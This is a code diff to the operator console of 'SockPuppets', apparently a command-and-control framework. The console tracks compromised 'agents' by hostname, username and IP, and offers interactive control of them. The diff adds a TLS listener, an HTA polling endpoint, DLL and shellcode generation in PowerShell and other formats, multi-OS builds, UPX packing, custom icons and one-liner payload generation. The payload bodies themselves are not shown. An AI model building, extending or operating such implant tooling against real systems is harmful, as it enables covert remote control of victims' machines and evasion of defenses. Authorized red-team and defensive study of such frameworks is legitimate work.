@@ -41,7 +41,7 @@ class SockPuppetsCLI(cmd.Cmd):
         self.encryption_key = 'SOCKPUPPETS_KEY_2026'
 
     def do_start(self, arg):
-        """Start the server: start [host] [port] [--key=<encryption_key>]"""
+        """Start the server: start [host] [port] [--key=<key>] [--ssl]"""
         if self.server_running:
             print("[-] Server is already running")
             return
@@ -50,26 +50,33 @@ class SockPuppetsCLI(cmd.Cmd):
         host = '0.0.0.0'
         port = 8443
         key = self.encryption_key
+        use_ssl = False
 
+        positional_idx = 0
         for arg in args:
             if arg.startswith('--key='):
                 key = arg.split('=', 1)[1]
                 self.encryption_key = key
-            elif args.index(arg) == 0 and not arg.startswith('--'):
-                host = arg
-            elif args.index(arg) == 1 and not arg.startswith('--'):
-                try:
-                    port = int(arg)
-                except ValueError:
-                    print("[-] Invalid port number")
-                    return
+            elif arg == '--ssl':
+                use_ssl = True
+            elif not arg.startswith('--'):
+                if positional_idx == 0:
+                    host = arg
+                elif positional_idx == 1:
+                    try:
+                        port = int(arg)
+                    except ValueError:
+                        print("[-] Invalid port number")
+                        return
+                positional_idx += 1
 
-        print(f"[*] Starting server on {host}:{port}...")
+        protocol = "wss" if use_ssl else "ws"
+        print(f"[*] Starting server on {protocol}://{host}:{port}...")
 
         def run_server():
             self.loop = asyncio.new_event_loop()
             asyncio.set_event_loop(self.loop)
-            self.loop.run_until_complete(start_server(host, port, key))
+            self.loop.run_until_complete(start_server(host, port, key, use_ssl))
 
         thread = threading.Thread(target=run_server, daemon=True)
         thread.start()
@@ -79,7 +86,10 @@ class SockPuppetsCLI(cmd.Cmd):
 
         self.server = get_server_instance()
         self.server_running = True
-        print(f"[+] Server started on {host}:{port}")
+        print(f"[+] Server started on {protocol}://{host}:{port}")
+        print(f"[+] HTA polling endpoint on http://{host}:{port + 1}/hta")
+        if use_ssl:
+            print(f"[+] TLS enabled (WSS mode)")
         if key != 'SOCKPUPPETS_KEY_2026':
             print(f"[+] Using custom encryption key")
 
@@ -90,9 +100,56 @@ class SockPuppetsCLI(cmd.Cmd):
             return
 
         print("[*] Stopping server...")
+
+        # Close all active WebSocket connections
+        if self.server:
+            for agent in self.server.agents.values():
+                if agent.websocket and agent.websocket in self.server.active_connections:
+                    try:
+                        asyncio.run_coroutine_threadsafe(
+                            agent.websocket.close(), self.loop
+                        ).result(timeout=2)
+                    except Exception:
+                        pass
+            self.server.active_connections.clear()
+            self.server.agents.clear()
+
+            # Close the WebSocket server
+            if hasattr(self.server, 'ws_server') and self.server.ws_server:
+                self.server.ws_server.close()
+
+        # Stop the event loop
+        if self.loop and self.loop.is_running():
+            self.loop.call_soon_threadsafe(self.loop.stop)
+
         self.server_running = False
         self.server = None
+        self.loop = None
         print("[+] Server stopped")
+
+    def _format_agent_list(self, agents, title, active_ids):
+        """Shared helper for formatting agent lists"""
+        print(f"\n\033[1m{title}:\033[0m")
+        print("=" * 80)
+        for agent in agents:
+            status = "\033[92m●\033[0m" if agent['id'] in active_ids else "\033[91m●\033[0m"
+            mode = agent['mode']
+            mode_badge = "\033[93m[BEACON]\033[0m" if mode == 'beacon' else "\033[92m[STREAM]\033[0m"
+
+            print(f"{status} \033[1m{agent['id']}\033[0m {mode_badge}")
+            print(f"   Hostname:   {agent['hostname']}")
+            print(f"   Username:   {agent['username']}")
+            print(f"   OS:         {agent['os']}")
+            print(f"   IP:         {agent['ip']}")
+            print(f"   Connected:  {agent['connected_at']}")
+            print(f"   Last Seen:  {agent['last_seen']}")
+            if mode == 'beacon':
+                jitter_str = f" ±{agent.get('beacon_jitter', '0')}" if 'beacon_jitter' in agent else ""
+                print(f"   Beacon:     {agent['beacon_interval']}s{jitter_str} interval")
+                health_warning = self.server.check_agent_health(agent['id'])
+                if health_warning:
+                    print(f"   \033[1;31m⚠ WARNING: {health_warning}\033[0m")
+            print()
 
     def do_agents(self, arg):
         """List all agents"""
@@ -105,30 +162,8 @@ class SockPuppetsCLI(cmd.Cmd):
             print("[-] No agents connected")
             return
 
-        print("\n\033[1mConnected Agents:\033[0m")
-        print("=" * 80)
-        for agent in agents:
-            status = "\033[92m●\033[0m" if agent in self.server.get_active_agents() else "\033[91m●\033[0m"
-            mode_badge = "\033[93m[BEACON]\033[0m" if agent['mode'] == 'beacon' else "\033[92m[STREAM]\033[0m"
-
-            # Check health for beacons
-            health_warning = ""
-            if agent['mode'] == 'beacon':
-                health_warning = self.server.check_agent_health(agent['id'])
-
-            print(f"{status} \033[1m{agent['id']}\033[0m {mode_badge}")
-            print(f"   Hostname:   {agent['hostname']}")
-            print(f"   Username:   {agent['username']}")
-            print(f"   OS:         {agent['os']}")
-            print(f"   IP:         {agent['ip']}")
-            print(f"   Connected:  {agent['connected_at']}")
-            print(f"   Last Seen:  {agent['last_seen']}")
-            if agent['mode'] == 'beacon':
-                jitter_str = f" ±{agent.get('beacon_jitter', '0')}" if 'beacon_jitter' in agent else ""
-                print(f"   Beacon:     {agent['beacon_interval']}s{jitter_str} interval")
-                if health_warning:
-                    print(f"   \033[1;31m⚠ WARNING: {health_warning}\033[0m")
-            print()
+        active_ids = {a['id'] for a in self.server.get_active_agents()}
+        self._format_agent_list(agents, "Connected Agents", active_ids)
 
     def do_puppets(self, arg):
         """List all agents (alias for 'agents')"""
@@ -140,32 +175,13 @@ class SockPuppetsCLI(cmd.Cmd):
             print("[-] Server is not running. Start it first with 'start'")
             return
 
-        agents = self.server.get_agent_list()
-        beacon_agents = [a for a in agents if a['mode'] == 'beacon']
-
-        if not beacon_agents:
+        agents = [a for a in self.server.get_agent_list() if a['mode'] == 'beacon']
+        if not agents:
             print("[-] No beacon agents connected")
             return
 
-        print("\n\033[1mBeacon Agents:\033[0m")
-        print("=" * 80)
-        active_agents = self.server.get_active_agents()
-        for agent in beacon_agents:
-            status = "\033[92m●\033[0m" if agent in active_agents else "\033[91m●\033[0m"
-            health_warning = self.server.check_agent_health(agent['id'])
-
-            print(f"{status} \033[1m{agent['id']}\033[0m \033[93m[BEACON]\033[0m")
-            print(f"   Hostname:   {agent['hostname']}")
-            print(f"   Username:   {agent['username']}")
-            print(f"   OS:         {agent['os']}")
-            print(f"   IP:         {agent['ip']}")
-            print(f"   Connected:  {agent['connected_at']}")
-            print(f"   Last Seen:  {agent['last_seen']}")
-            jitter_str = f" ±{agent.get('beacon_jitter', '0')}" if 'beacon_jitter' in agent else ""
-            print(f"   Beacon:     {agent['beacon_interval']}s{jitter_str} interval")
-            if health_warning:
-                print(f"   \033[1;31m⚠ WARNING: {health_warning}\033[0m")
-            print()
+        active_ids = {a['id'] for a in self.server.get_active_agents()}
+        self._format_agent_list(agents, "Beacon Agents", active_ids)
 
     def do_streamers(self, arg):
         """List only streaming mode agents"""
@@ -173,26 +189,34 @@ class SockPuppetsCLI(cmd.Cmd):
             print("[-] Server is not running. Start it first with 'start'")
             return
 
-        agents = self.server.get_agent_list()
-        streaming_agents = [a for a in agents if a['mode'] == 'streaming']
-
-        if not streaming_agents:
+        agents = [a for a in self.server.get_agent_list() if a['mode'] == 'streaming']
+        if not agents:
             print("[-] No streaming agents connected")
             return
 
-        print("\n\033[1mStreaming Agents:\033[0m")
-        print("=" * 80)
-        active_agents = self.server.get_active_agents()
-        for agent in streaming_agents:
-            status = "\033[92m●\033[0m" if agent in active_agents else "\033[91m●\033[0m"
-            print(f"{status} \033[1m{agent['id']}\033[0m \033[92m[STREAM]\033[0m")
-            print(f"   Hostname:   {agent['hostname']}")
-            print(f"   Username:   {agent['username']}")
-            print(f"   OS:         {agent['os']}")
-            print(f"   IP:         {agent['ip']}")
-            print(f"   Connected:  {agent['connected_at']}")
-            print(f"   Last Seen:  {agent['last_seen']}")
-            print()
+        active_ids = {a['id'] for a in self.server.get_active_agents()}
+        self._format_agent_list(agents, "Streaming Agents", active_ids)
+
+    def do_remove(self, arg):
+        """Remove a dead agent from tracking: remove <agent_id>"""
+        if not self.server_running:
+            print("[-] Server is not running")
+            return
+
+        if not arg:
+            print("[-] Usage: remove <agent_id>")
+            return
+
+        agent_id = arg.strip()
+        if agent_id not in self.server.agents:
+            print(f"[-] Agent {agent_id} not found")
+            return
+
+        agent = self.server.agents[agent_id]
+        if agent.websocket in self.server.active_connections:
+            self.server.active_connections.discard(agent.websocket)
+        del self.server.agents[agent_id]
+        print(f"[+] Agent {agent_id} removed from tracking")
 
     def do_interact(self, arg):
         """Interact with an agent: interact <agent_id>"""
@@ -489,23 +513,35 @@ class SockPuppetsCLI(cmd.Cmd):
             print("      --interval=N           Beacon interval in seconds")
             print("      --jitter=N             Beacon jitter percentage (0-100)")
             print("      --compile              Compile Python agent to executable")
+            print("      --dll                  Compile Python agent to DLL (Windows)")
+            print("      --shellcode            Generate shellcode from agent")
+            print("      --format=FMT           Shellcode format (raw, c, python, powershell)")
+            print("      --os=OS                Target OS (auto, windows, linux, macos)")
+            print("      --multi-os             Generate agents for all OS types")
             print("      --arch=ARCH            Target architecture (x86, x64, arm64)")
             print("      --multi-arch           Compile for all architectures")
             print("      --no-upx               Disable UPX compression")
             print("      --icon=PATH            Icon file for executable")
             print("      --key=KEY              Encryption key")
+            print("      --oneliners=URL        Generate one-liner payloads")
             return
 
         host = None
         port = None
         key = self.encryption_key
         compile_exe = False
+        compile_dll = False
+        gen_shellcode = False
+        shellcode_format = 'raw'
         beacon_mode = False
         beacon_interval = 60
         beacon_jitter = 0
         architectures = ['x64']
         use_upx = True
         icon = None
+        target_os = 'auto'
+        multi_os = False
+        oneliners_url = None
 
         i = 0
         while i < len(args):
@@ -566,13 +602,42 @@ class SockPuppetsCLI(cmd.Cmd):
                 if not os.path.exists(icon):
                     print(f"[-] Icon file not found: {icon}")
                     return
+            elif arg.startswith('--format'):
+                val = get_value('--format')
+                if val is None:
+                    return
+                if val in ['raw', 'c', 'python', 'powershell']:
+                    shellcode_format = val
+                else:
+                    print(f"[-] Invalid shellcode format: {val}")
+                    return
+            elif arg.startswith('--os'):
+                val = get_value('--os')
+                if val is None:
+                    return
+                if val in ['auto', 'windows', 'linux', 'macos']:
+                    target_os = val
+                else:
+                    print(f"[-] Invalid OS: {val}")
+                    return
+            elif arg.startswith('--oneliners'):
+                val = get_value('--oneliners')
+                if val is None:
+                    return
+                oneliners_url = val
             elif arg == '--compile':
                 compile_exe = True
+            elif arg == '--dll':
+                compile_dll = True
+            elif arg == '--shellcode':
+                gen_shellcode = True
             elif arg == '--beacon':
                 beacon_mode = True
             elif arg == '--multi-arch':
                 architectures = ['x86', 'x64', 'arm64']
                 compile_exe = True
+            elif arg == '--multi-os':
+                multi_os = True
             elif arg == '--no-upx':
                 use_upx = False
             elif host is None:
@@ -596,24 +661,42 @@ class SockPuppetsCLI(cmd.Cmd):
         if beacon_mode:
             jitter_text = f" ±{beacon_jitter}%" if beacon_jitter > 0 else ""
             print(f"[*] Beacon mode enabled ({beacon_interval}s{jitter_text} interval)")
+        if target_os != 'auto':
+            print(f"[*] Target OS: {target_os}")
+        if multi_os:
+            print(f"[*] Multi-OS generation enabled")
         if compile_exe:
             print(f"[*] Compilation enabled for: {', '.join(architectures)}")
             if use_upx:
                 print(f"[*] UPX compression enabled")
             if icon:
                 print(f"[*] Using icon: {icon}")
+        if compile_dll:
+            print(f"[*] DLL compilation enabled")
+        if gen_shellcode:
+            print(f"[*] Shellcode generation enabled ({shellcode_format} format)")
 
         generator = AgentGenerator()
-        results = generator.generate_all(host, port, key, beacon_mode, beacon_interval, beacon_jitter,
-                                        compile_exe, architectures, use_upx, icon)
+        results = generator.generate_all(
+            c2_host=host, c2_port=port, encryption_key=key,
+            beacon_mode=beacon_mode, beacon_interval=beacon_interval, beacon_jitter=beacon_jitter,
+            compile_exe=compile_exe, compile_dll=compile_dll, generate_shellcode=gen_shellcode,
+            shellcode_format=shellcode_format, architectures=architectures, upx=use_upx, icon=icon,
+            target_os=target_os, generate_multi_os=multi_os
+        )
 
         print("\n[+] Agent generation complete!")
         print("=" * 60)
         for agent_type, path in results.items():
-            if not path.startswith('Error'):
-                print(f"  {agent_type.upper()}: {path}")
-            else:
-                print(f"  {agent_type.upper()}: {path}")
+            print(f"  {agent_type.upper()}: {path}")
+
+        # Generate one-liners if requested
+        if oneliners_url:
+            print("\n[*] Generating one-liner payloads...")
+            oneliners = generator.generate_oneliners(oneliners_url, 'oneliners.txt')
+            print(f"[+] Generated {len(oneliners)} one-liner variants")
+            for name in oneliners.keys():
+                print(f"    - {name}")
 
     def do_debug(self, arg):
         """Toggle debug mode: debug [on|off]"""
@@ -647,8 +730,7 @@ class SockPuppetsCLI(cmd.Cmd):
     def do_exit(self, arg):
         """Exit the program"""
         if self.server_running:
-            print("[*] Stopping server...")
-            self.server_running = False
+            self.do_stop('')
 
         print("[*] Goodbye!")
         sys.exit(0)
@@ -665,12 +747,13 @@ class SockPuppetsCLI(cmd.Cmd):
 
         print("\n\033[1mAvailable Commands:\033[0m")
         print("=" * 70)
-        print("  \033[1mstart [host] [port] [--key=K]\033[0m       - Start the server")
+        print("  \033[1mstart [host] [port] [--key=K] [--ssl]\033[0m - Start the server")
         print("  \033[1mstop\033[0m                                 - Stop the server")
         print("  \033[1magents / puppets\033[0m                     - List all connected agents")
         print("  \033[1mbeacons\033[0m                              - List only beacon agents")
         print("  \033[1mstreamers\033[0m                            - List only streaming agents")
         print("  \033[1minteract <agent_id>\033[0m                  - Interact with an agent")
+        print("  \033[1mremove <agent_id>\033[0m                    - Remove dead agent from tracking")
         print("  \033[1mgenerate <host> <port> [opts]\033[0m       - Generate agent payloads")
         print("  \033[1mdebug [on|off]\033[0m                       - Toggle debug logging")
         print("  \033[1mclear\033[0m                                - Clear the screen")
@@ -682,11 +765,17 @@ class SockPuppetsCLI(cmd.Cmd):
         print("  \033[1m--interval=N\033[0m          Beacon check-in interval in seconds")
         print("  \033[1m--jitter=N\033[0m            Beacon jitter percentage (0-100)")
         print("  \033[1m--compile\033[0m             Compile Python agent to executable")
+        print("  \033[1m--dll\033[0m                 Compile Python agent to DLL (Windows)")
+        print("  \033[1m--shellcode\033[0m           Generate shellcode from agent")
+        print("  \033[1m--format=FMT\033[0m          Shellcode format (raw, c, python, powershell)")
+        print("  \033[1m--os=OS\033[0m               Target OS (auto, windows, linux, macos)")
+        print("  \033[1m--multi-os\033[0m            Generate agents for all OS types")
         print("  \033[1m--arch=ARCH\033[0m           Target architecture (x86, x64, arm64)")
         print("  \033[1m--multi-arch\033[0m          Compile for all architectures")
         print("  \033[1m--no-upx\033[0m              Disable UPX compression")
         print("  \033[1m--icon=PATH\033[0m           Custom icon for executable")
         print("  \033[1m--key=KEY\033[0m             Custom encryption key")
+        print("  \033[1m--oneliners=URL\033[0m       Generate one-liner payloads")
         print()
         print("\033[1mAgent Commands:\033[0m")
         print("=" * 70)
